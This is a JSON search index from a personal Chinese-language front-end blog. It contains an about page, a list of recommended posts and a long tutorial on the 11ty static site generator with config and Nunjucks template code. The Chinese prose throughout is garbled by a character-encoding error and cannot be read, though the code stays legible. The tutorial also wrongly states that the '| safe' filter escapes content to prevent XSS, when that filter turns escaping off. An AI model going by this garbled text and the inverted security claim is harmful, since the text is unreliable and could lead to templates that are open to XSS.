{"pages":[{"title":"é—œæ–¼æˆ‘","text":"Hiï¼Œæˆ‘æ˜¯ PeaNuï¼ˆæ‰¹åŠªï¼‰ï¼ŒPeaNu é€™å€‹åå­—æ˜¯å¾ PeaNut ä¾†è¯æƒ³çš„ï¼Œå› ç‚ºæˆ‘å¾ˆå–œæ­¡èŠ±ç”Ÿé†¬ â¤ åœ¨åŠªåŠ›è‡ªå­¸äº†ä¸€æ®µæ™‚é–“å¾Œæˆç‚ºäº†ä¸€åå‰ç«¯å·¥ç¨‹å¸«ï¼Œç›®å‰ä¾ç„¶åœ¨åŠªåŠ›å­¸ç¿’å‰ç«¯çŸ¥è­˜ï¼Œå¸Œæœ›æœ‰æœä¸€æ—¥èƒ½å¤ æ›ä¸Šã€Œè³‡æ·±å‰ç«¯å·¥ç¨‹å¸«ã€é€™å€‹åç‰Œ ğŸ˜† åœ¨è¸å…¥é€™å¡Šé ˜åŸŸå¾Œé«”æœƒåˆ°ä¸å°‘é…¸ç”œè‹¦è¾£ï¼ŒåŸä¾†è¦æˆç‚ºä¸€å€‹å·¥ç¨‹å¸«ä¸¦ä¸æ˜¯ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚ä¸éæ¯ç•¶è‡ªå·±å®Œæˆä¸€ä»½å°ˆæ¡ˆæ™‚ï¼Œå¿ƒè£¡å°±æœƒæ„Ÿåˆ°ç‰¹åˆ¥é–‹å¿ƒï¼Œä¹Ÿç‰¹åˆ¥çš„æœ‰æˆå°±æ„Ÿã€‚ é—œæ–¼é€™å€‹éƒ¨è½æ ¼æœ¬ä¾†ä¹Ÿæƒ³åƒç¶²è·¯ä¸Šçš„å¤§å¤§ä¸€æ¨£å¯«æ–‡ç« ä¾†å¹«åŠ©åˆ¥äººï¼Œä½†å¾Œä¾†ç™¼ç¾å¯«æ–‡ç« å¯¦åœ¨å¾ˆèŠ±æ™‚é–“ï¼Œæ‰€ä»¥å¾Œä¾†é€™å€‹éƒ¨è½æ ¼è®Šæˆæ¯”è¼ƒåƒæ˜¯æˆ‘çš„ç­†è¨˜æœ¬å§ï¼ ç¸½è€Œè¨€ä¹‹ï¼Œé›–ç„¶é€™è£¡ä¸»è¦éƒ½æ˜¯æ”¾æˆ‘çš„ç­†è¨˜ï¼Œä½†é‚„æ˜¯å¸Œæœ›æœ‰äº›å…§å®¹èƒ½å¤ å‰›å¥½å¹«åŠ©åˆ°ä½ ã€‚ å¦‚æœä½ æœ‰ä»»ä½•è©±æƒ³å°æˆ‘èªªï¼Œéƒ½æ­¡è¿ä¾†å¯„ä¿¡çµ¦æˆ‘ï¼špeanu01001@gmail.com","link":"/about/index.html"},{"title":"æ–‡ç« åˆ†é¡","text":"","link":"/categories/index.html"},{"title":"æ¨è–¦é–±è®€","text":"é€™é‚Šçš„æ±è¥¿å¯¦åœ¨é‚„è »é›œçš„ XDï¼Œæ‰€ä»¥æˆ‘å°±ä¾ç…§ç¨®é¡ä¾†æ¨è–¦ä¸€äº›æˆ‘è¦ºå¾—ä¸éŒ¯çš„å¥½äº†ã€‚ æƒ³çœ‹è·Ÿ CSS æœ‰é—œçš„ ä¸€æ­¥ä¸€æ­¥èªè­˜Grid åœ¨å­¸éŸ¿æ‡‰å¼è¨­è¨ˆå‰ï¼Œä½ æ‡‰è©²å…ˆçŸ¥é“é€™äº›ã€‚ CSS å‚ç›´ç½®ä¸­ CSS ä¸­çš„ counter å±¬æ€§ CSS ä¸­ html èˆ‡ body çš„å‘ä¸Šå‚³éè¡Œç‚º åœ¨ CSS ä¸­åšå­—ä¸²æ‹¼æ¥ CSS å¥½ç”¨çš„ filter å±¬æ€§ CSS å¤šè¡Œæ–‡å­—é¡¯ç¤º â€¦ çš„æ•ˆæœ CSS åˆ©ç”¨ Sprite ä¾†æå‡æ•ˆèƒ½ æƒ³çœ‹è·Ÿ JavaScript æœ‰é—œçš„ ç†è§£ function å‚³éåƒæ•¸çš„æ©Ÿåˆ¶ å¯¦ä½œæ¨¡çµ„æ©Ÿåˆ¶ å¯¦ä½œ JSONP å…ˆç†è§£ä½œç”¨åŸŸè·Ÿå›å‚³å€¼ï¼Œå†ä¾†è«‡é–‰åŒ…ã€‚ å¾éŠæˆ²ä¾†èªè­˜ CORS èˆ‡ç€è¦½å™¨çš„é™åˆ¶ ç†è§£ä»€éº¼æ˜¯ race-condition äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼æ•ç²èˆ‡å†’æ³¡ Promise çš„å°æŠ€å·§ DOM æ¸…æ‰æƒ±äººçš„æ–‡å­—ç¯€é» ä»€éº¼æ˜¯ AJAXï¼Ÿ åˆ©ç”¨ IntersectionObserver ä¾†è£½ä½œç„¡é™æ»¾å‹• å¾è¨­éŒ¯åƒæ•¸ä¾†å­¸ç¿’ async èˆ‡ sync çš„å·®ç•° å¾ fetch ä¾†èªè­˜ Promise å­¸ hoisting ä¹‹å‰å…ˆç†è§£ EC æ˜¯ä»€éº¼ï¼Ÿ ç†è§£åŸå‹éŠçš„é‹ä½œ å¾ ECMAScript ä¾†ç†è§£é–‰åŒ…èˆ‡ä½œç”¨åŸŸçš„åŸç† é–‰åŒ…çš„å¯¦éš›æ‡‰ç”¨ï¼šthrottle å’Œ debounce é‡æ–°ç†è§£ this çš„å€¼ æƒ³çœ‹è·Ÿ React æœ‰é—œçš„ React çš„ç¬¬ä¸€å€‹ hookï¼šuseState React çš„ç¬¬äºŒå€‹ hookï¼šuseRef React çš„ç¬¬ä¸‰å€‹ hookï¼šuseEffect React çš„ç¬¬å››å€‹ hookï¼šuseLayoutEffect React çš„ç¬¬äº”å€‹ hookï¼šmemo React çš„ç¬¬å…­å€‹ hookï¼šuseCallback React çš„ç¬¬ä¸ƒå€‹ hookï¼šuseMemo React çš„ç¬¬å…«å€‹ hookï¼šuseContext èˆ‡ createContext åˆæ¢ Class-component React class component çš„ç”Ÿå‘½é€±æœŸ åˆæ¢ Redux æƒ³çœ‹è·Ÿå¾Œç«¯æœ‰é—œçš„ åˆ©ç”¨ Cookie å¯¦ä½œç™»å…¥æ©Ÿåˆ¶ ç•¶ Cookie è¢«ç«„æ”¹æœƒæ€éº¼æ¨£ï¼Ÿ ç”¨ PHP å¯¦ä½œåˆ†é åŠŸèƒ½ è³‡æ–™åº«ä¸­çš„ Transactioã€ACID å’Œ Lock è³‡æ–™åº«ä¸­çš„ Viewã€Stored Procedure å’Œ Triggers æƒ³çœ‹è·Ÿè³‡å®‰æœ‰é—œçš„ å¾ç©å£è‡ªå·±çš„ç¶²ç«™ä¾†å­¸ç¿’ XSS ç”¨ SQL Injection ä¾†ç©å£è³‡æ–™åº« å¾ PHP å­¸ç¿’æ¬Šé™ç®¡ç†çš„é‡è¦æ€§ èªè­˜ CSRF ä½ æƒ³ä¸åˆ°çš„ XSS æ”»æ“Šæ–¹å¼ æƒ³çœ‹è·Ÿæ¼”ç®—æ³•æœ‰é—œçš„ æ·ºè«‡æ™‚é–“è¤‡é›œåº¦èˆ‡ç©ºé–“è¤‡é›œåº¦ é¸æ“‡æ’åºæ³•ï¼ˆSelection sortï¼‰ æ³¡æ²«æ’åºæ³•ï¼ˆBubble-sortï¼‰ æ’å…¥æ’åºæ³•ï¼ˆInsertion-sortï¼‰ å¿«é€Ÿæ’åºæ³•ï¼ˆQuick-sortï¼‰ äºŒåˆ†æœå°‹æ³•ï¼ˆBinary-searchï¼‰","link":"/recommend/index.html"}],"posts":[{"title":"11ty-Notes","text":"ä¸€æ¨£ä¾†åšå€‹ç­†è¨˜ã€‚ Configæ¨è–¦é–±è®€ï¼šhttps://www.11ty.dev/docs/config/ åœ¨æ ¹ç›®éŒ„å»ºç«‹ .eleventy.jsï¼Œé€™å€‹æª”æ¡ˆå°±æ˜¯ 11ty çš„ configï¼Œå¯ä»¥åœ¨è£¡é¢å¯«å…¥æˆ‘å€‘æƒ³è¦çš„è¨­å®šï¼š 12345678910111213module.exports = function (eleventyConfig) { return { dir: { input: 'src', includes: '_includes', output: '_site' }, templateFormats: ['md', 'njk', 'html'], markdownTemplateEngine: 'njk', // è®“ä½ å¯ä»¥åœ¨ markdown è£¡é¢å¯« njkï¼Œåº•ä¸‹ä»¥æ­¤é¡æ¨ã€‚ htmlTemplateEngine: 'njk', dataTemplateEngine: 'njk' }} Basic Structure1234567891011â”œâ”€â”€ _siteâ”‚&nbsp;&nbsp; â”œâ”€â”€ index.htmlâ”‚&nbsp;&nbsp; â””â”€â”€ srcâ”‚&nbsp;&nbsp; â””â”€â”€ index.htmlâ”œâ”€â”€ package-lock.jsonâ”œâ”€â”€ package.jsonâ””â”€â”€ src â”œâ”€â”€ _includes â”‚&nbsp;&nbsp; â””â”€â”€ layouts â”‚&nbsp;&nbsp; â””â”€â”€ base.html â””â”€â”€ index.html å­¸ä»»ä½•ä¸€é …çŸ¥è­˜å‰ï¼Œå…ˆç†è§£å°ˆæ¡ˆçµæ§‹æ˜¯å¾ˆé‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥é€™é‚Šåˆ†åˆ¥èªªæ˜ä¸€ä¸‹ï¼š _site æ˜¯ç”¢ç”Ÿå¾Œçš„éœæ…‹æª”æ¡ˆ src é€²å…¥é» src/_includes æ”¾ç½®æ¨£æ¿çš„åœ°æ–¹ src/_includes/layouts/base.html æ¨£æ¿ä¸€ï¼ˆæ•´å€‹ç¶²ç«™çš„åŸºç¤çµæ§‹ï¼‰ src/index.html ç¶²ç«™é¦–é  é‹ç”¨æ¨£æ¿ä¾†å–ä»£ Hardcodeå»¶çºŒå‰›å‰›çš„æª”æ¡ˆçµæ§‹ï¼Œå‡è¨­ç›®å‰é¦–é ï¼ˆsrc/index.htmlï¼‰å…§å®¹æ˜¯é€™æ¨£ï¼š 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;title&gt;ç¶²ç«™æ¨™é¡Œ&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;é¦–é &lt;/h1&gt; &lt;p&gt;ä¸€äº›æ•˜è¿°&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; çœ‹èµ·ä¾†å°±æ˜¯ä¸€èˆ¬çš„ HTMLï¼Œæ²’ä»€éº¼å•é¡Œã€‚ä½†æœ‰ä¸€å€‹å•é¡Œæ˜¯ã€Œå¦‚æœæˆ‘æƒ³è¦å†æ–°å¢å…¶ä»–é é¢å‘¢ï¼Ÿã€ å‡è¨­ç¾åœ¨æƒ³æ–°å¢ä¸€å€‹ã€Œé—œæ–¼æˆ‘ã€çš„é é¢ï¼Œé‚£æˆ‘å¯èƒ½å°±éœ€è¦å†å¯«ä¸€ä»½ about.htmlï¼š 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;title&gt;é—œæ–¼æˆ‘&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;é—œæ–¼æˆ‘&lt;/h1&gt; &lt;p&gt;ä¸€äº›æ•˜è¿°&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; å¯ä»¥çœ‹åˆ°æˆ‘å€‘åªä¿®æ”¹äº† &lt;title&gt; å’Œ &lt;body&gt; ä¸­çš„å…§å®¹ï¼Œè€Œå…¶ä»–éƒ¨åˆ†æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ã€‚ é€™é¡¯ç„¶ä¸æ˜¯ä¸€å€‹å¾ˆå¥½çš„åšæ³•ã€‚ åœ¨éå¿…è¦çš„æƒ…æ³ä¸‹æˆ‘å€‘æœƒç›¡å¯èƒ½é¿å…ã€ŒHardcodeï¼ˆå¯«æ­»ï¼‰ã€çš„ä½œæ³•ï¼Œæ‰€ä»¥ 11ty ä¸­å¯ä»¥é€é Nunjucks é€™å¥—æ¨¡æ¿å¼•æ“ä¾†è™•ç†ã€‚ é¦–å…ˆï¼Œæˆ‘å€‘å¯ä»¥åœ¨ src/_includes/layouts åº•ä¸‹å»ºç«‹ä¸€å€‹ base.htmlï¼Œä¸¦å¡«å…¥åº•ä¸‹å…§å®¹ï¼š 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;title&gt;{{ title }}&lt;/title&gt; &lt;/head&gt; &lt;body&gt; {{ content | safe }} &lt;/body&gt;&lt;/html&gt; ä¸€èˆ¬ä¾†èªªï¼Œä½ æ‡‰è©²æ˜¯å»ºç«‹ä¸€å€‹ .njk æª”æ¡ˆï¼Œæ‰æ¥è‘—åœ¨è£¡é¢å¯« HTMLï¼Œè€Œä¸æ˜¯åƒé€™é‚Šå»ºç«‹ä¸€å€‹ .html æª”æ¡ˆï¼Œç„¶å¾Œç›´æ¥åœ¨è£¡é¢å¯« nunjucks çš„èªæ³•ã€‚ç‚ºä»€éº¼ï¼Ÿå› ç‚ºæ­£å¸¸çš„ HTML ä¸¦æ²’æœ‰è¾¦æ³•è§£æ nunjucks çš„èªæ³•ã€‚é€™é‚Šä¹‹æ‰€ä»¥èƒ½é€™æ¨£åšæ˜¯å› ç‚ºå‰é¢åœ¨ .eleventy.js ä¸­æœ‰å¯«å…¥å°æ‡‰çš„è¨­å®šï¼Œæ‰€ä»¥ eleventy æ‰æœƒçŸ¥é“è¦ç”¨ nunjucks å»è§£æ .html æª”æ¡ˆçš„å…§å®¹ã€‚ æ¨¡æ¿çš„å¥½è™•å°±æ˜¯å¯ä»¥åœ¨è£¡é¢åŠ å…¥ã€Œè®Šæ•¸ã€æµç¨‹åˆ¤æ–·ã€ç­‰ç¨‹å¼èªè¨€çš„ç‰¹æ€§ã€‚é€™é‚Šåœ¨ &lt;tilte&gt; ä¸­æ”¾å…¥äº†ä¸€å€‹ {{ title }}ï¼Œæ„æ€æ˜¯èªªè£¡é¢çš„æ–‡å­—è¦æ˜¯ title é€™å€‹è®Šæ•¸çš„å€¼ï¼Œè€Œ &lt;body&gt; ä¹Ÿæ˜¯åŒæ¨£çš„æ¦‚å¿µã€‚ ä¸éä½ å¯èƒ½æœƒæƒ³å•ã€Œé‚£ title å’Œ content é€™å…©å€‹è®Šæ•¸è¦å¾å“ªè£¡ä¾†ï¼Ÿé‚„æœ‰ï¼Œcontent å¾Œé¢çš„ | safe åˆæ˜¯ä»€éº¼æ±è¥¿ï¼Ÿã€ å›ç­”ç¬¬ä¸€å€‹å•é¡Œå‰ï¼Œæˆ‘å€‘å…ˆæŠŠ src/index.html åšé»ä¿®æ”¹ï¼š 1234567891011---layout: layouts/base.htmltitle: Learn 11ty---&lt;h1&gt;I am the Home Page.&lt;/h1&gt;&lt;p&gt; Lorem ipsum dolor sit, amet consectetur adipisicing elit. Odio quidem non dolor, placeat blanditiis quas itaque distinctio optio aperiam. Tenetur sequi quasi ea perferendis iste quia itaque fugit, distinctio magni.&lt;/p&gt; è¨»ï¼šå†æé†’ä¸€æ¬¡ï¼Œä¹‹æ‰€ä»¥èƒ½ç›´æ¥åœ¨ HTML ä¸­å¯« Front Matter çš„èªæ³•æ˜¯å› ç‚ºåœ¨ eleventy.js ä¸­æœ‰åšè¨­å®šã€‚ æŠŠæ±è¥¿å¯«åœ¨ --- è£¡é¢çš„é€™ç¨®å¯«æ³•å«åšã€ŒFront Matterã€ï¼Œæ˜¯ markdown æä¾›çš„ä¸€ç¨®èªæ³•ï¼Œä¸€èˆ¬æ˜¯ç”¨ä¾†å¯«å…¥ç¶²é çš„ meta è³‡è¨Šã€‚ é€™è£¡åœ¨ Front Matter ä¸­æŒ‡å®šäº† layout: layouts/base.htmlï¼Œä»£è¡¨èªªé€™é‚Šçš„å…§å®¹è¦å¥—åˆ°ç”¨å‰é¢å¯«å¥½çš„æ¨£æ¿ï¼Œä¸¦ä¸”ä¹ŸæŒ‡å®šäº† title çš„å…§å®¹ã€‚ çœ‹åˆ°é€™é‚Šï¼Œæ‡‰è©²ä¸é›£çŒœåˆ° title å’Œ body é€™å…©å€‹è®Šæ•¸çš„å€¼å°±æ˜¯å¾é€™é‚Šä¾†çš„ï¼Œå€¼æœƒæ˜¯ Learn 11ty å’Œ &lt;body&gt; ä¸­çš„å…§å®¹ã€‚ è‡³æ–¼ç¬¬äºŒå€‹å•é¡Œï¼Œè¦å…ˆçŸ¥é“ | æ˜¯ nunjucks ä¸­çš„ Filterã€‚åŠŸèƒ½å°±è·Ÿ CLI è£¡é¢çš„é‚£å€‹ | å·®ä¸å¤šï¼ŒæœƒæŠŠå‰é¢çš„æ±è¥¿ã€Œæ¥éä¾†ã€åšä¸€äº›è™•ç†ã€‚ æ‰€ä»¥é€™è£¡çš„ | safe å¾ˆæ˜é¡¯æ˜¯æŠŠå‰é¢çš„å­—ä¸²éƒ½åšã€Œè·³è„«ã€çš„è™•ç†ï¼Œä¸»è¦æ˜¯ç‚ºäº†é¿å… XSS çš„å•é¡Œã€‚ é™¤äº†ä¸Šé¢é€™ç¨®æ‹¿å¯«å¥½çš„æ¨£æ¿ä¾†ç”¨ä»¥å¤–ï¼Œnunjucks é‚„æä¾›äº†å¾ˆå¤šåŠŸèƒ½ï¼Œåƒæ˜¯ extends æˆ– include ç­‰ç­‰ï¼Œåœ¨å¯¦å‹™ä¸Šæœƒè »å¸¸çœ‹åˆ°å®ƒå€‘çš„ï¼Œæ‰€ä»¥å¼·çƒˆå»ºè­°ç¢°åˆ°ä¸æ‡‚çš„èªæ³•æ™‚å¯ä»¥åˆ° nunjucks çš„ å®˜æ–¹æ–‡ä»¶ ä¸­æŸ¥é–±ã€‚ è®€å–éœæ…‹è³‡æºæ¨è–¦é–±è®€ï¼šhttps://www.11ty.dev/docs/copy/ å‡è¨­ç›®å‰å°ˆæ¡ˆçš„è³‡æ–™çµæ§‹é•·é€™æ¨£ï¼š 12345678910111213â”œâ”€â”€ package-lock.jsonâ”œâ”€â”€ package.jsonâ””â”€â”€ src â”œâ”€â”€ _includes â”‚&nbsp;&nbsp; â”œâ”€â”€ head.html â”‚&nbsp;&nbsp; â””â”€â”€ layouts â”‚&nbsp;&nbsp; â”œâ”€â”€ base.html â”‚&nbsp;&nbsp; â””â”€â”€ contact.html â”œâ”€â”€ assets &lt;- æ–°å¢ assets è³‡æ–™å¤¾ â”‚&nbsp;&nbsp; â””â”€â”€ images â”‚&nbsp;&nbsp; â””â”€â”€ carbon.png â”œâ”€â”€ contact.html â””â”€â”€ index.html é€™æ™‚å€™ä½ å¯èƒ½æœƒæƒ³åœ¨æ¨¡æ¿ä¸­å­˜å–åœ¨ assets ä¸­éœæ…‹è³‡æºï¼Œé€™äº›è³‡æºå¯ä»¥æ˜¯åœ–ç‰‡ã€å½±ç‰‡æˆ– CSS ç­‰ç­‰ã€‚ä¸éç•¶ä½ å¯«å¥½è·¯å¾‘å¾Œä½ æœƒå°±ç™¼ç¾å­˜å–ä¸åˆ°ï¼Œé€™æ˜¯ç‚ºä»€éº¼å‘¢ï¼Ÿ é€™æ˜¯å› ç‚º 11ty é è¨­ä¸æœƒæŠŠ .html ä»¥å¤–çš„æª”æ¡ˆæˆ–è³‡æ–™å¤¾ç”¢ç”Ÿåˆ° _site åº•ä¸‹ï¼Œæ‰€ä»¥å¿…é ˆåœ¨ config åŠ å…¥ addPassthroughCopy ä¾†è™•ç†ï¼š 12345678910111213141516module.exports = function (eleventyConfig) { // æŠŠæŒ‡å®šè·¯å¾‘çš„å…§å®¹è¤‡è£½åˆ° _site ä¸‹ eleventyConfig.addPassthroughCopy('src/assets') return { dir: { input: 'src', includes: '_includes', output: '_site' }, templateFormats: ['md', 'njk', 'html'], markdownTemplateEngine: 'njk', htmlTemplateEngine: 'njk', dataTemplateEngine: 'njk' }} è¨­å®šå¥½ 11ty ä»¥å¾Œæ•´å€‹ assets å°±æœƒè¢«è¤‡è£½éå»ï¼Œè‡ªç„¶å°±èƒ½è®€å–åˆ°å°æ‡‰çš„è³‡æ–™äº†ã€‚ åƒå…ƒä»¶ä¸€æ¨£çš„ Shortcodeæ¨è–¦é–±è®€ï¼šhttps://www.11ty.dev/docs/shortcodes/ 11ty æä¾›äº† Shortcode çš„åŠŸèƒ½ï¼Œè®“ä½ å¯ä»¥ç”¨å¾ˆåƒ Component çš„æ¦‚å¿µä¾†å°è£ä¸€æ®µ HTMLï¼Œæˆ‘å€‘ç›´æ¥ä¾†çœ‹ç¯„ä¾‹ã€‚ é¦–å…ˆåˆ° _includes åº•ä¸‹å»ºç«‹ä¸€å€‹ Card.jsï¼š 123456789101112const { html } = require('common-tags')function Card({ title, link, linkText, raised }) { return html` &lt;div class=\"card__container blah blah ${raised ? 'card__container--raised' : ''}\"&gt; &lt;h2 class=\"card__title\"&gt;${title}&lt;/h2&gt; &lt;a class=\"card__link\" href=\"${link}\"&gt;${linkText}&lt;/a&gt; &lt;/div&gt; `}module.exports = Card è¨»ï¼šé€™é‚Šçš„ htmlï¼ˆæ¨£æ¿å­—ä¸²ï¼‰æ˜¯ common-tags æä¾›çš„åŠŸèƒ½ã€‚ æ¥è‘—åˆ° .eleventy.js åŠ å…¥é€™æ®µï¼š 12345678910111213141516171819202122// åˆ¥å¿˜äº†å¼•å…¥const Card = require('./src/_includes/components/card')module.exports = function (eleventyConfig) { eleventyConfig.addPassthroughCopy('src/assets') eleventyConfig.addPassthroughCopy('src/css') // åŠ ä¸Šé€™ä¸€è¡Œ eleventyConfig.addShortcode('Card', Card) return { dir: { input: 'src', includes: '_includes', output: '_site' }, templateFormats: ['md', 'njk', 'html'], markdownTemplateEngine: 'njk', htmlTemplateEngine: 'njk', dataTemplateEngine: 'njk' }} æ¥ä¸‹ä¾†åœ¨æ¨¡æ¿ä¸­å°±å¯ä»¥é€™æ¨£ä½¿ç”¨ï¼š 1{% Card title=\"Hello\", link=\"https://google.com\", linkText=\"Go to Google\" %} è¨»ï¼šè¨˜å¾—è¦æ¯å€‹åƒæ•¸é–“è¦ç”¨ , ä¾†éš”é–‹ã€‚ Collectionsæ¨è–¦é–±è®€ï¼šhttps://www.11ty.dev/docs/collections/ collections æ˜¯ç”¨ä¾†å­˜å–åœ¨ Front Matter ä¸­æœ‰ä½¿ç”¨ tags æ¨™è¨»çš„å…§å®¹ï¼Œä¾‹å¦‚èªªï¼š 123456789---title: Rxjs Crash Coursedescription: This is a post on about Rxjs Crash Course.date: 2018-08-25layout: layouts/post.htmltags: posts---... æƒ³åƒé€™æ˜¯éƒ¨è½æ ¼è£¡é¢çš„æŸä¸€ç¯‡æ–‡ç« ï¼Œä¸¦ä¸”æŠŠ tags è¨­ç‚º postsï¼Œé€™æ¨£çš„ç”¨é€”æ˜¯ä»€éº¼ï¼Ÿ åœ¨ 11ty ä¸­ tags æ˜¯ä¸€å€‹æ¯”è¼ƒç‰¹åˆ¥çš„å±¬æ€§ï¼Œä¸€æ—¦è¨­ç½®äº†é€™å€‹å±¬æ€§å¾Œå°±æœƒ 11ty å°±æœƒè‡ªå‹•ç”¢ç”Ÿä¸€çµ„å°æ‡‰çš„ collectionsã€‚ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘è¨­ç½®äº† tags: postsï¼Œæ‰€ä»¥å°±æœƒç”¢ç”Ÿä¸€çµ„å«åš posts çš„ collectionsã€‚ collections å¯ä»¥åšä»€éº¼ï¼Ÿé€™é‚Šä¾†èˆ‰å€‹ä¾‹å­ã€‚ å‡è¨­ä½ æƒ³è¦æœ‰ä¸€å€‹é¡¯ç¤ºã€Œæ–‡ç« åˆ—è¡¨ã€çš„é é¢ï¼Œä½ å¯ä»¥é€é collections ä¾†æŠŠæ‰€æœ‰ posts çš„æ–‡ç« è³‡æ–™éƒ½æ‹¿å‡ºä¾†ï¼š 123456789&lt;h1&gt;Posts&lt;/h1&gt;&lt;ul&gt; {% for post in collections.posts %} &lt;li&gt; &lt;a href=\"{{ post.url }}\"&gt;{{ post.data.title }} at {{ post.data.date }}&lt;/a&gt; &lt;/li&gt; {% endfor %}&lt;/ul&gt; é€™è£¡ç”¨äº†è¿´åœˆä¾†éæ­· collections.posts é€™å€‹é™£åˆ—ï¼Œä¸¦ä¸”æŠŠæ–‡ç« çš„ urlã€title å’Œ date çµ¦å–å‡ºä¾†æ¸²æŸ“åˆ°ç•«é¢ä¸Šã€‚ å°±è·Ÿå‰é¢èªªçš„ä¸€æ¨£ï¼Œåªè¦æœ‰ä½¿ç”¨ tags: posts çš„æ–‡ç« éƒ½æœƒå‡ºç¾åœ¨ collections.posts ä¸­ï¼Œé€™æ˜¯ 11ty è‡ªå‹•åœ¨èƒŒå¾Œå¹«æˆ‘å€‘ç”¢ç”Ÿçš„ collectionsï¼Œæ‰€ä»¥æˆ‘å€‘æ‰å¯ä»¥ç›´æ¥åœ¨æ¨¡æ¿ä¸­å­˜å–åˆ°ã€‚ é™¤äº†æ–‡ç« è‡ªèº«çš„ Front Matter è³‡è¨Šä»¥å¤–ï¼Œ11ty ä¹Ÿæœƒè‡ªå‹•åŠ å…¥ä¸€äº›æœ‰ç”¨çš„è³‡è¨Šï¼Œåƒé€™è£¡å°±ç”¨åˆ°äº† urlï¼Œé€™æ˜¯å¾ˆæœ‰ç”¨çš„è³‡æ–™ï¼ å»ºç«‹è‡ªå·±çš„ collectionsé™¤äº†é€é tags ä¾†ç”¢ç”Ÿ collections ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥é€é .eleventy.js ä¾†æ·»åŠ æˆ‘å€‘è‡ªå·±çš„ collectionsã€‚ é›–ç„¶å‰›å‰›æœ‰èªªæˆ‘å€‘å¯ä»¥åœ¨æ¯ä¸€ç¯‡æ–‡ç« åŠ ä¸Š tags: post ä¾†ç”¢ç”Ÿ collectionï¼Œä½†å¦‚æœæ¯ä¸€ç¯‡æ–‡ç« éƒ½è¦è‡ªå·±æ‰‹å‹•åŠ å…¶å¯¦é‚„è »éº»ç…©çš„ï¼Œå°å§ï¼Ÿ æ‰€ä»¥æˆ‘å€‘å¯ä»¥ç›´æ¥å‘Šè¨´ 11tyã€Œè«‹ç›´æ¥å¹«æˆ‘æŠŠ xx è·¯å¾‘åº•ä¸‹çš„æ‰€æœ‰ .md æª”æ¡ˆå»ºç«‹æˆä¸€ä»½ collectionsã€ï¼Œåƒé€™æ¨£ï¼š 12345module.exports = function (eleventyConfig) { eleventyConfig.addCollection('posts', function (collectionApi) { return collectionApi.getFilteredByGlob('src/blog/posts/**/*.md') })} é€™é‚Šç”¨äº† addCollection ä¾†å»ºç«‹ä¸€å€‹æ–°çš„ collectionsï¼ˆpostï¼‰ï¼Œæ¥è‘—åœ¨å‚³å…¥ä¸€å€‹ callback ä¾†å›å‚³é€™å€‹ collections çš„å…§å®¹ã€‚é€™å€‹ callback æœƒè‡ªå‹•æ¥æ”¶ä¸€å€‹ collectionApiã€‚å¦‚å…¶åï¼Œå®ƒå°±æ˜¯å€‹ 11ty æä¾›çš„ APIï¼Œä½ å¯ä»¥ç”¨å®ƒä¾†å–å¾—ä½ æƒ³è¦çš„è³‡æ–™ï¼Œé€™é‚Šæ˜¯ç”¨ glob èªæ³•ä¾†æŠŠæ‰€æœ‰ src/blog/posts åº•ä¸‹çš„ .md æª”éƒ½å–å‡ºã€‚ é€éé€™æ®µè¨­å®šå¾Œï¼Œå°±ä¸éœ€è¦å†å¹«æ¯ä¸€ç¯‡æ–‡ç« éƒ½åŠ ä¸Š tags: posts äº†ï¼Œå¯ä»¥ç›´æ¥é€é collections.posts ä¾†å­˜å–ç›¸åŒçš„è³‡æ–™ã€‚ Paginationæ¨è–¦é–±è®€ï¼šhttps://www.11ty.dev/docs/pagination/ ã€Œåˆ†é ã€æ‡‰è©²æ˜¯å¾ˆå¸¸è¦‹çš„éœ€æ±‚ï¼Œæ‰€ä»¥é€™é‚Šä¾†ä»‹ç´¹å¦‚ä½•åœ¨ä¸€å€‹é é¢ä¸­é€éåˆ†é ä¾†é¡¯ç¤ºéƒ¨åˆ†è³‡æ–™ã€‚ åŸºæœ¬ç¯„ä¾‹åˆ†é èƒŒå¾Œçš„åŸç†æ˜¯åˆ©ç”¨å–®ä¸€å€‹ template ä¾†ç”¢ç”Ÿå‡ºå¤šå€‹ templateï¼Œå› ç‚ºåªè¦è®“æ¯ä¸€å€‹ template æ‹¿åˆ°çš„è³‡æ–™æ˜¯ä¸åŒçš„ï¼Œå°±èƒ½æ¸²æŸ“å‡ºä¸åŒçš„å…§å®¹äº†ã€‚ é€™é‚Šä¾†çœ‹å®˜ç¶²é™„çš„ç¯„ä¾‹ï¼š 12345678910111213141516---pagination: data: testdata size: 2testdata: - item1 - item2 - item3 - item4---&lt;ol&gt; {%- for item in pagination.items %} &lt;li&gt;{{ item }}&lt;/li&gt; {% endfor -%}&lt;/ol&gt; å‡è¨­é€™å€‹é é¢æ˜¯åœ¨ /paged è·¯å¾‘çš„è©±ï¼Œ11ty å°±æœƒæ‹¿é€™å€‹æ¨¡æ¿å‡ºç”¢ç”Ÿå‡º _site/paged/index.html å’Œ _site/paged/1/index.html å…©å€‹é é¢ã€‚ è¦å•Ÿç”¨ pagination çš„æ­¥é©Ÿæœ‰å…©å€‹ï¼š åœ¨ Front Matter ä¸­åŠ å…¥ paginationã€‚data 